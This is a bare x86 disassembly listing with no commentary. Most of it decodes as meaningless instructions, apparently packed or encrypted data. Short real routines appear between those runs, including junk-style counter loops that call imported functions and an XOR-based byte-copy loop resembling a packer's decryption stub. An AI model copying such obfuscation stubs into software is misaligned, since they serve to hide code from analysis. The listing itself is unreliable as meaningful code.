  40f320:	imul   esi,DWORD PTR [ecx+0x4e],0xfffffff8
  40f324:	fcmovbe st,st(6)
  40f326:	cmc    
  40f327:	and    BYTE PTR [ebx-0x22ae2027],dl
  40f32d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f32e:	mov    dl,0x43
  40f330:	xchg   ebx,eax
  40f331:	(bad)  
  40f332:	adc    ah,BYTE PTR [eax-0xe]
  40f335:	cwde   
  40f336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f337:	pop    edx
  40f338:	push   es
  40f339:	aad    0x8
  40f33b:	ja     0x40f33e
  40f33d:	mov    cl,0xd0
  40f33f:	inc    ecx
  40f340:	pop    es
  40f341:	pop    eax
  40f342:	fsubr  DWORD PTR [ecx+0x36]
  40f345:	in     al,dx
  40f346:	aas    
  40f347:	test   eax,0x65c91f0f
  40f34c:	enter  0xfbcc,0x24
  40f350:	sub    al,0x2b
  40f352:	dec    ebp
  40f353:	pop    esp
  40f354:	ins    DWORD PTR es:[edi],dx
  40f355:	cs jge 0x40f3cf
  40f358:	jge    0x40f3c2
  40f35a:	pop    edx
  40f35b:	shl    DWORD PTR [ecx-0x12366b88],1
  40f361:	test   bh,ch
  40f363:	fisubr DWORD PTR [ebx-0x13f140b4]
  40f369:	or     dh,BYTE PTR [edx+0x1e]
  40f36c:	mov    es,WORD PTR [esi]
  40f36e:	add    dl,ah
  40f370:	xlat   BYTE PTR ds:[ebx]
  40f371:	jg     0x40f35c
  40f373:	rcr    BYTE PTR [esi],0x88
  40f376:	sub    ch,bl
  40f378:	loop   0x40f37a
  40f37a:	pop    esp
  40f37b:	dec    eax
  40f37c:	iret   
  40f37d:	dec    esp
  40f37e:	and    bl,dh
  40f380:	add    cl,BYTE PTR [ecx-0x48]
  40f383:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40f389:	daa    
  40f38a:	aaa    
  40f38b:	inc    ebx
  40f38c:	add    BYTE PTR [eax],al
  40f38e:	add    BYTE PTR [eax],al
  40f390:	add    BYTE PTR [ebx],dh
  40f392:	leave  
  40f393:	xor    ecx,DWORD PTR ds:0x433727
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433727,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433727,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433727,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433727
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433727,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433727,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43362b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433703
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433657,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433657,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433657,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433657
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433657,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4336ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4336ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4336ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4336ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4336ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4336ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4336db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4336db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4336db,edx
  40f498:	cmp    DWORD PTR ds:0x4336db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433891
  40f4af:	push   0x4338e7
  40f4b4:	push   0x4338cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4336db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433717
  40f4d2:	adc    DWORD PTR ds:0x433727,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x4a4a52c7]
  40f540:	push   esp
  40f541:	aam    0xac
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	jmp    0x40f4d7
  40f54b:	xchg   edx,eax
  40f54c:	int3   
  40f54d:	mov    esp,0x2adc7226
  40f552:	lods   eax,DWORD PTR ds:[esi]
  40f553:	fnstcw WORD PTR [ecx+0x2f]
  40f556:	loopne 0x40f5ca
  40f558:	addr16 cmp bh,ch
  40f55b:	sub    ebx,DWORD PTR [esi-0x4d]
  40f55e:	pop    eax
  40f55f:	jbe    0x40f59d
  40f561:	imul   edi,DWORD PTR [edx+0x5700196c],0x33785780
  40f56b:	pusha  
  40f56c:	enter  0x5435,0x55
  40f570:	push   ebx
  40f571:	addr16 inc edi
  40f573:	ror    edi,cl
  40f575:	pop    ds
  40f576:	test   eax,0xde02d7af
  40f57b:	loope  0x40f519
  40f57d:	sbb    eax,0xa5cbccc9
  40f582:	mov    eax,ds:0x829b9079
  40f587:	sbb    al,al
  40f589:	out    dx,eax
  40f58a:	and    eax,esp
  40f58c:	xchg   ebx,eax
  40f58d:	ins    BYTE PTR es:[edi],dx
  40f58e:	rcl    BYTE PTR ds:0xd0b74913,0xc8
  40f595:	xchg   ecx,eax
  40f596:	pop    esi
  40f597:	dec    ebx
  40f598:	add    ah,BYTE PTR [ebx+ebx*8]
  40f59b:	loope  0x40f5eb
  40f59d:	test   BYTE PTR [esi+0x61],al
  40f5a0:	stc    
  40f5a1:	sar    DWORD PTR [esi+ecx*8-0x9],cl
  40f5a5:	mov    edi,0x917eac82
  40f5aa:	or     al,0x17
  40f5ac:	jmp    0x40f624
  40f5ae:	xlat   BYTE PTR ds:[ebx]
  40f5af:	je     0x40f5d8
  40f5b1:	dec    ebp
  40f5b2:	mov    eax,ds:0x4a652829
  40f5b7:	add    dh,dl
  40f5b9:	adc    al,0xe0
  40f5bb:	sbb    DWORD PTR [edx-0x71],ebp
  40f5be:	sbb    DWORD PTR [ebx],edx
  40f5c0:	xor    al,0xe8
  40f5c2:	fnstsw WORD PTR [esi]
  40f5c4:	rcl    eax,cl
  40f5c6:	inc    eax
  40f5c7:	mov    dh,0x8e
  40f5c9:	dec    ecx
  40f5ca:	or     ch,bl
  40f5cc:	lea    edx,[edx-0x40]
  40f5cf:	xor    DWORD PTR [esp+eiz*2-0x37d32d9],edi
  40f5d6:	xchg   ebp,ecx
  40f5d8:	jge    0x40f64b
  40f5da:	mov    edi,0xec065e4b
  40f5df:	leave  
  40f5e0:	pop    es
  40f5e1:	pop    ds
  40f5e2:	dec    esp
  40f5e3:	mov    cl,0x57
  40f5e5:	mov    bl,0x3b
  40f5e7:	enter  0xf0df,0x9c
  40f5eb:	test   DWORD PTR [edx-0x5c0ba7e0],esp
  40f5f1:	nop
  40f5f2:	adc    al,BYTE PTR [eax-0x21]
  40f5f5:	fisubr WORD PTR [esi+0x6eacbd96]
  40f5fb:	nop
  40f5fc:	mov    bh,0x97
  40f5fe:	imul   ebp,DWORD PTR [edi-0x51ebb0c0],0x74cfb186
  40f608:	stc    
  40f609:	mov    edx,0xf1acefeb
  40f60e:	mov    esp,0x5b1f8b27
  40f613:	js     0x40f651
  40f615:	push   ss
  40f616:	call   0x1688:0xd04efbae
  40f61d:	jg     0x40f5b0
  40f61f:	or     eax,0xfae2d94e
  40f624:	cld    
  40f625:	xor    DWORD PTR [esi+0x54],ebp
  40f628:	leave  
  40f629:	sbb    eax,0xcfa94fd4
  40f62e:	fdivr  st(7),st
  40f630:	inc    esp
  40f631:	xor    eax,0x520d56e1
  40f636:	xlat   BYTE PTR ds:[ebx]
  40f637:	inc    edi
  40f638:	sbb    DWORD PTR [ebp+0x1fc8f6b],esi
  40f63e:	fist   DWORD PTR [edx-0x2e1d2ac7]
  40f644:	mov    eax,ds:0x2d99e6a7
  40f649:	bound  edx,QWORD PTR [ebx-0x50b26b20]
  40f64f:	mov    ah,0xc8
  40f651:	bound  esi,QWORD PTR [ecx]
  40f653:	fnsave [eax+0x17]
  40f656:	out    0xdf,eax
  40f658:	scas   eax,DWORD PTR es:[edi]
  40f659:	inc    ebx
  40f65a:	lock xchg ecx,eax
  40f65c:	js     0x40f679
  40f65e:	push   ecx
  40f65f:	lods   eax,DWORD PTR ds:[esi]
  40f660:	daa    
  40f661:	arpl   WORD PTR [edi],cx
  40f663:	popf   
  40f664:	sti    
  40f665:	into   
  40f666:	loope  0x40f6d5
  40f668:	stc    
  40f669:	lods   al,BYTE PTR ds:[esi]
  40f66a:	stc    
  40f66b:	xor    DWORD PTR [edx-0x760706cb],edx
  40f671:	out    0xec,al
  40f673:	pushf  
  40f674:	cmp    ch,cl
  40f676:	(bad)  
  40f677:	fadd   DWORD PTR [edi-0x50d63af3]
  40f67d:	mov    esi,0xac8856a4
  40f682:	loope  0x40f638
  40f684:	sahf   
  40f685:	sub    dh,BYTE PTR [eax]
  40f687:	aam    0x17
  40f689:	xchg   ebx,eax
  40f68a:	pop    ds
  40f68b:	in     al,dx
  40f68c:	mov    ebp,0x67d4caba
  40f691:	(bad)  
  40f692:	jge    0x40f6b3
  40f694:	aas    
  40f695:	ins    BYTE PTR es:[edi],dx
  40f696:	push   edx
  40f697:	pushw  ds
  40f699:	add    ebp,DWORD PTR [esp+eax*2]
  40f69c:	jmp    DWORD PTR [ebx-0x38891d8b]
  40f6a2:	adc    DWORD PTR [ebp+0xa],eax
  40f6a5:	fldcw  WORD PTR [esi-0x3]
  40f6a8:	es xchg ecx,eax
  40f6aa:	add    al,0x57
  40f6ac:	aaa    
  40f6ad:	pop    ecx
  40f6ae:	fucomi st,st(5)
  40f6b0:	fcom   QWORD PTR [esi]
  40f6b2:	push   es
  40f6b3:	xchg   DWORD PTR [ecx-0x2db3ddd],edx
  40f6b9:	push   ds
  40f6ba:	mov    al,0xc5
  40f6bc:	jns    0x40f666
  40f6be:	xlat   BYTE PTR ds:[ebx]
  40f6bf:	xor    bh,BYTE PTR [esi+0x4fb949d9]
  40f6c5:	adc    BYTE PTR [ebx-0x5c],ch
  40f6c8:	(bad)  
  40f6c9:	test   al,0xdf
  40f6cb:	push   eax
  40f6cc:	das    
  40f6cd:	scas   al,BYTE PTR es:[edi]
  40f6ce:	test   al,0x96
  40f6d0:	xor    BYTE PTR [eax],al
  40f6d2:	(bad)  
  40f6d3:	pusha  
  40f6d4:	pop    ebp
  40f6d5:	pop    ss
  40f6d6:	cmp    BYTE PTR fs:[ebx],ah
  40f6d9:	xchg   esp,eax
  40f6da:	jb     0x40f73d
  40f6dc:	imul   edi,DWORD PTR [esi+ecx*8+0x45],0x8ca109dd
  40f6e4:	dec    edi
  40f6e5:	cli    
  40f6e6:	adc    al,0x40
  40f6e8:	std    
  40f6e9:	jb     0x40f6ba
  40f6eb:	pop    eax
  40f6ec:	jl     0x40f6c0
  40f6ee:	nop
  40f6ef:	xor    eax,0x63cfd72
  40f6f4:	test   DWORD PTR [ecx+edx*2],0xf6f9f197
  40f6fb:	adc    al,0x65
  40f6fd:	stos   DWORD PTR es:[edi],eax
  40f6fe:	xchg   esp,eax
  40f6ff:	ficom  DWORD PTR [edi]
  40f701:	pop    es
  40f702:	adc    eax,0xd36c7f29
  40f707:	xor    dl,bh
  40f709:	jne    0x40f757
  40f70b:	mov    edx,DWORD PTR [ebx]
  40f70d:	popa   
  40f70e:	cld    
  40f70f:	sbb    eax,0x7bd6a405
  40f714:	sbb    eax,0x1a45ce75
  40f719:	inc    edi
  40f71a:	dec    edi
  40f71b:	test   BYTE PTR [ebp+0x3472fc0b],bl
  40f721:	or     eax,0x770f28
  40f726:	or     BYTE PTR [edi-0x5310763c],dl
  40f72c:	and    BYTE PTR [eax+ecx*4],al
  40f72f:	loopne 0x40f759
  40f731:	pop    edx
  40f732:	push   ss
  40f733:	sub    al,0x44
  40f735:	inc    edx
  40f736:	das    
  40f737:	das    
  40f738:	xor    DWORD PTR [eax-0x1155fb95],edx
  40f73e:	inc    edi
  40f73f:	(bad)  
  40f740:	aas    
  40f741:	inc    eax
  40f742:	push   ecx
  40f743:	sub    eax,0x71f39ea3
  40f748:	in     al,0x59
  40f74a:	push   cs
  40f74b:	nop
  40f74c:	(bad)
  40f750:	sbb    ecx,esp
  40f752:	stos   BYTE PTR es:[edi],al
  40f753:	xor    edi,ecx
  40f755:	fstp   TBYTE PTR [ebx+ecx*2+0x31bb814d]
  40f75c:	pop    ds
  40f75d:	mov    esp,edx
  40f75f:	sbb    eax,0xac7cf918
  40f764:	mov    al,ds:0x1b506784
  40f769:	or     ah,BYTE PTR [edi+0x6a42c37a]
  40f76f:	mov    edx,0xa0ce495a
  40f774:	xor    dl,cl
  40f776:	fist   DWORD PTR [edi]
  40f778:	push   ecx
  40f779:	lods   al,BYTE PTR ds:[esi]
  40f77a:	out    dx,eax
  40f77b:	repnz lods eax,DWORD PTR ds:[esi]
  40f77d:	and    dl,BYTE PTR [esi]
  40f77f:	or     BYTE PTR [ecx],dh
  40f781:	nop
  40f782:	shl    BYTE PTR [edi-0x6a340519],0xd2
  40f789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f78a:	repz mov cl,BYTE PTR [ecx]
  40f78d:	leave  
  40f78e:	out    dx,eax
  40f78f:	lds    edi,FWORD PTR [edi+0x1e]
  40f792:	adc    al,BYTE PTR [eax]
  40f794:	das    
  40f795:	mov    dh,0x97
  40f797:	inc    ebx
  40f798:	or     DWORD PTR [edx],ecx
  40f79a:	fild   QWORD PTR [ebp-0x68359f94]
  40f7a0:	repz loope 0x40f764
  40f7a3:	pushf  
  40f7a4:	sahf   
  40f7a5:	daa    
  40f7a6:	pop    ecx
  40f7a7:	pop    ds
  40f7a8:	pop    esp
  40f7a9:	and    al,0x7d
  40f7ab:	dec    DWORD PTR [edi]
  40f7ad:	dec    edi
  40f7ae:	jb     0x40f74c
  40f7b0:	add    al,0x7f
  40f7b2:	and    cl,BYTE PTR [esi-0x6a]
  40f7b5:	mov    BYTE PTR [edi+ecx*8-0xb],dl
  40f7b9:	push   ebp
  40f7ba:	and    DWORD PTR [eax-0x16],0xffffff8e
  40f7be:	stos   BYTE PTR es:[edi],al
  40f7bf:	rcl    BYTE PTR [esi+0x1204e7f6],cl
  40f7c5:	les    ebx,FWORD PTR [edi-0xa711892]
  40f7cb:	in     eax,dx
  40f7cc:	clc    
  40f7cd:	icebp  
  40f7ce:	cmp    ecx,DWORD PTR [esi]
  40f7d0:	ins    BYTE PTR es:[edi],dx
  40f7d1:	pop    eax
  40f7d2:	popa   
  40f7d3:	push   ss
  40f7d4:	fs jbe 0x40f7fa
  40f7d7:	jecxz  0x40f7ba
  40f7d9:	int3   
  40f7da:	jle    0x40f79d
  40f7dc:	aaa    
  40f7dd:	push   ds
  40f7de:	lds    edx,FWORD PTR [ecx-0x1d]
  40f7e1:	enter  0x2ea5,0x59
  40f7e5:	mov    BYTE PTR [ebx-0x18ad3cff],dh
  40f7eb:	mov    bh,0x84
  40f7ed:	cs popa 
  40f7ef:	push   ebx
  40f7f0:	(bad)
  40f7f3:	push   es
  40f7f4:	scas   eax,DWORD PTR es:[edi]
  40f7f5:	fld    st(7)
  40f7f7:	je     0x40f78d
  40f7f9:	mov    bh,0x1a
  40f7fb:	lahf   
  40f7fc:	retf   
  40f7fd:	je     0x40f862
  40f7ff:	(bad)  
  40f800:	imul   eax,DWORD PTR [edi+edi*8+0x5f],0x4b
  40f805:	xchg   esi,eax
  40f806:	inc    esp
  40f807:	ins    BYTE PTR es:[edi],dx
  40f808:	dec    ebp
  40f809:	mov    ah,0x8f
  40f80b:	pop    ss
  40f80c:	ret    
  40f80d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f80e:	jl     0x40f828
  40f810:	push   0x51
  40f812:	xchg   edx,eax
  40f813:	les    ebx,FWORD PTR [ecx+0x1509ff69]
  40f819:	shl    ch,cl
  40f81b:	jae    0x40f7fd
  40f81d:	lahf   
  40f81e:	je     0x40f897
  40f820:	and    eax,0x4db40a7b
  40f825:	push   cs
  40f826:	popa   
  40f827:	std    
  40f828:	push   0x6c7568a9
  40f82d:	cmp    al,0x7a
  40f82f:	pop    edx
  40f830:	mov    esp,0xecdf744a
  40f835:	and    DWORD PTR [edi],0xbf2693ea
  40f83b:	sar    DWORD PTR [ecx],cl
  40f83d:	sbb    BYTE PTR [ebx],dl
  40f83f:	mov    cs,WORD PTR [ebp+0x2a]
  40f842:	mov    WORD PTR [esi*4-0x1f3d2383],es
  40f849:	shl    DWORD PTR [ebp-0x1fc06cd],cl
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0x4d74933f
  40f897:	inc    edi
  40f898:	shr    BYTE PTR [ebx+0x7d7c7e7e],cl
  40f89e:	jle    0x40f91e
  40f8a0:	shl    DWORD PTR [edi+ebp*8+0xe],1
  40f8a4:	add    al,0x30
  40f8a6:	xor    BYTE PTR [edi-0x3c56d01a],bl
  40f8ac:	fs loopne 0x40f85a
  40f8af:	adc    al,0x37
  40f8b1:	cmp    al,0x13
  40f8b3:	jle    0x40f917
  40f8b5:	jno    0x40f8b2
  40f8b7:	scas   al,BYTE PTR es:[edi]
  40f8b8:	and    DWORD PTR [eax+0x134252d4],ecx
  40f8be:	adc    al,0xb
  40f8c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8c1:	jbe    0x40f916
  40f8c3:	pop    ds
  40f8c4:	pop    ds
  40f8c5:	or     ch,dh
  40f8c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8c8:	and    esi,DWORD PTR ds:[ebx-0x7a52fc09]
  40f8cf:	add    esp,DWORD PTR [ecx]
  40f8d1:	mov    DWORD PTR ds:0xca72337c,ecx
  40f8d7:	lds    ecx,FWORD PTR [ebp+0x6354adda]
  40f8dd:	(bad)  
  40f8de:	add    BYTE PTR ds:[edi-0x461fda9c],al
  40f8e5:	mul    BYTE PTR [esi+0x3fa63f76]
  40f8eb:	jp     0x40f872
  40f8ed:	jo     0x40f8ea
  40f8ef:	lods   al,BYTE PTR ds:[esi]
  40f8f0:	(bad)  
  40f8f2:	inc    ecx
  40f8f3:	imul   esi,DWORD PTR [eax-0x75],0x53bc97fd
  40f8fa:	jmp    FWORD PTR [eax+0x172c021f]
  40f900:	sub    BYTE PTR [edx],0xd5
  40f903:	loop   0x40f8f2
  40f905:	jo     0x40f95d
  40f907:	mov    ah,0xe2
  40f909:	push   ecx
  40f90a:	test   DWORD PTR [edi],edi
  40f90c:	mov    ebp,0xa72586fd
  40f911:	pop    ebx
  40f912:	sar    BYTE PTR [eax-0x75],cl
  40f915:	xor    BYTE PTR [edx+0x98338cb],0x22
  40f91c:	adc    BYTE PTR [ecx+0x7e45e50],ah
  40f922:	mov    ds:0x7645626b,eax
  40f927:	stc    
  40f928:	retf   
  40f929:	sbb    DWORD PTR [ebx+0x1a],eax
  40f92c:	fisttp WORD PTR [esi]
  40f92e:	cli    
  40f92f:	pop    ebx
  40f930:	int3   
  40f931:	add    al,0xb7
  40f933:	ss push ss
  40f935:	aaa    
  40f936:	data16 cmp dl,ah
  40f939:	(bad)  
  40f93a:	fisttp DWORD PTR [edx+ebx*8+0x3ee68739]
  40f941:	inc    eax
  40f942:	or     eax,0x3f951869
  40f947:	add    cl,BYTE PTR [ecx]
  40f949:	xchg   ecx,eax
  40f94a:	jge    0x40f970
  40f94c:	adc    ah,BYTE PTR [ebx]
  40f94e:	int    0x5a
  40f950:	fiadd  WORD PTR [eax+0x1d]
  40f953:	adc    ah,ch
  40f955:	shl    DWORD PTR [eax+0x58],0xbc
  40f959:	jl     0x40f905
  40f95b:	xor    dh,bl
  40f95d:	adc    eax,0xe9593525
  40f962:	sub    BYTE PTR [ecx+0x1d],bh
  40f965:	push   ds
  40f966:	out    0x76,eax
  40f968:	scas   al,BYTE PTR es:[edi]
  40f969:	lods   al,BYTE PTR cs:[esi]
  40f96b:	dec    edi
  40f96c:	and    DWORD PTR [eax],edi
  40f96e:	outs   dx,BYTE PTR ds:[esi]
  40f96f:	neg    BYTE PTR [edx+0x684126ec]
  40f975:	mov    ss,WORD PTR [ebx]
  40f977:	lahf   
  40f978:	ss ins BYTE PTR es:[edi],dx
  40f97a:	sbb    DWORD PTR [ecx-0x79],edi
  40f97d:	ja     0x40f9f8
  40f97f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f980:	fwait
  40f981:	int    0x53
  40f983:	rol    BYTE PTR [esi+edi*1],cl
  40f986:	mov    dl,0xad
  40f988:	adc    DWORD PTR [edi+0x5f],ecx
  40f98b:	inc    edx
  40f98c:	(bad)  
  40f98d:	push   esp
  40f98e:	(bad)  [eax+edx*4]
  40f991:	sahf   
  40f992:	mov    cl,0x35
  40f994:	jp     0x40f975
  40f996:	in     eax,0xb6
  40f998:	sbb    eax,0xb454c286
  40f99d:	cmp    al,0x5c
  40f99f:	pop    ebp
  40f9a0:	xor    dl,bh
  40f9a2:	cmp    edi,DWORD PTR [eax+0x18]
  40f9a5:	pop    esi
  40f9a6:	mov    BYTE PTR [ebx],bh
  40f9a8:	push   ebp
  40f9a9:	push   edx
  40f9aa:	loope  0x40fa2a
  40f9ac:	stos   BYTE PTR es:[edi],al
  40f9ad:	mov    ebx,0x85aeaaed
  40f9b2:	arpl   WORD PTR [ebp+0x75e2cf1],bx
  40f9b8:	(bad)
  40f9bc:	out    0x58,al
  40f9be:	test   BYTE PTR [ebx+0x38],ah
  40f9c1:	sar    ecx,1
  40f9c3:	pop    edi
  40f9c4:	or     DWORD PTR [edi+0x38],esi
  40f9c7:	cmp    esi,DWORD PTR [ecx-0x52]
  40f9ca:	push   es
  40f9cb:	sbb    DWORD PTR [ecx-0x5104137c],esi
  40f9d1:	inc    ebp
  40f9d2:	push   cs
  40f9d3:	jle    0x40f9c1
  40f9d5:	sbb    ecx,DWORD PTR [edx+ecx*8-0x77]
  40f9d9:	push   ebp
  40f9da:	or     al,ah
  40f9dc:	pop    es
  40f9dd:	ins    DWORD PTR es:[edi],dx
  40f9de:	sub    al,BYTE PTR [edi-0x4a]
  40f9e1:	push   cs
  40f9e2:	push   ecx
  40f9e3:	imul   edi,DWORD PTR ds:0x761984c8,0x5b
  40f9ea:	mov    ah,0x77
  40f9ec:	jne    0x40fa4f
  40f9ee:	adc    eax,0x25710845
  40f9f3:	dec    esp
  40f9f4:	hlt    
  40f9f5:	aam    0x9
  40f9f7:	mov    ah,0x8e
  40f9f9:	jl     0x40f9a7
  40f9fb:	dec    edi
  40f9fc:	mov    ecx,0x30fce6dd
  40fa01:	sbb    al,0x1
  40fa03:	retf   0x25f0
  40fa06:	pop    edx
  40fa07:	dec    edx
  40fa08:	(bad)  
  40fa09:	popf   
  40fa0a:	push   esp
  40fa0b:	pop    edx
  40fa0c:	mov    esp,0x84b007f6
  40fa11:	or     ecx,DWORD PTR [ecx]
  40fa13:	push   edi
  40fa14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa16:	push   esp
  40fa17:	inc    esp
  40fa18:	fidiv  DWORD PTR [edx-0x41ceff02]
  40fa1e:	jo     0x40f9a3
  40fa20:	add    DWORD PTR [ebx-0x5e],ebx
  40fa23:	pop    eax
  40fa24:	and    eax,0x9ef059e6
  40fa29:	jg     0x40faa6
  40fa2b:	jns    0x40fa48
  40fa2d:	into   
  40fa2e:	les    esi,FWORD PTR [ebx]
  40fa30:	sub    DWORD PTR ds:0x25252c76,ebx
  40fa36:	xchg   ebx,eax
  40fa37:	and    al,BYTE PTR [ebp+0x2b]
  40fa3a:	pop    ebx
  40fa3b:	mov    eax,0xdc7becf9
  40fa40:	loop   0x40fa4f
  40fa42:	inc    ebx
  40fa43:	(bad)  
  40fa44:	out    dx,al
  40fa45:	es stc 
  40fa47:	(bad)  
  40fa48:	dec    edx
  40fa49:	cld    
  40fa4a:	mov    ds:0x6c198eec,eax
  40fa4f:	jbe    0x40fa64
  40fa51:	stos   DWORD PTR es:[edi],eax
  40fa52:	mov    eax,eax
  40fa54:	adc    eax,0x3c504a16
  40fa59:	and    BYTE PTR [edx+0x484eee8e],ah
  40fa5f:	mov    bl,0x0
  40fa61:	dec    edx
  40fa62:	aas    
  40fa63:	loopne 0x40fa44
  40fa65:	push   cs
  40fa66:	push   eax
  40fa67:	adc    al,0xb
  40fa69:	add    esp,DWORD PTR [eax+ebx*1-0x67a8aceb]
  40fa70:	stos   DWORD PTR es:[edi],eax
  40fa71:	daa    
  40fa72:	xchg   ecx,eax
  40fa73:	gs test cl,0x6a
  40fa77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa79:	(bad)  
  40fa7a:	and    BYTE PTR ds:0xb2acd4d4,0x96
  40fa81:	push   esi
  40fa82:	in     al,dx
  40fa83:	inc    bp
  40fa85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa86:	mov    edx,0x28b87eb8
  40fa8b:	dec    ecx
  40fa8c:	jp     0x40fad3
  40fa8e:	push   cs
  40fa8f:	jns    0x40fa3a
  40fa91:	ja     0x40facc
  40fa93:	jbe    0x40fb0f
  40fa95:	dec    esp
  40fa96:	(bad)  
  40fa97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa98:	popw   es
  40fa9a:	test   al,0x71
  40fa9c:	dec    edx
  40fa9d:	jae    0x40fa30
  40fa9f:	data16 fmul QWORD PTR [esi-0x55348c96]
  40faa6:	mov    edi,0xe820848d
  40faab:	cmp    BYTE PTR [esi+0x48a1251e],dl
  40fab1:	retf   
  40fab2:	imul   esp,DWORD PTR [edi-0xf],0x6c48f6db
  40fab9:	pop    ds
  40faba:	test   ch,bl
  40fabc:	push   eax
  40fabd:	scas   al,BYTE PTR es:[edi]
  40fabe:	or     dh,BYTE PTR [esi]
  40fac0:	fwait
  40fac1:	cwde   
  40fac2:	(bad)  
  40fac3:	jle    0x40fa53
  40fac5:	xchg   esp,eax
  40fac6:	inc    esi
  40fac7:	and    BYTE PTR [edi],0xb2
  40faca:	fcmovbe st,st(6)
  40facc:	xor    eax,0x50d14f4b
  40fad1:	or     al,ah
  40fad3:	outs   dx,BYTE PTR ds:[esi]
  40fad4:	xchg   ebx,eax
  40fad5:	or     al,0xf3
  40fad7:	outs   dx,BYTE PTR ds:[esi]
  40fad8:	cs mov edi,0x2611b9e8
  40fade:	and    DWORD PTR [esi],edx
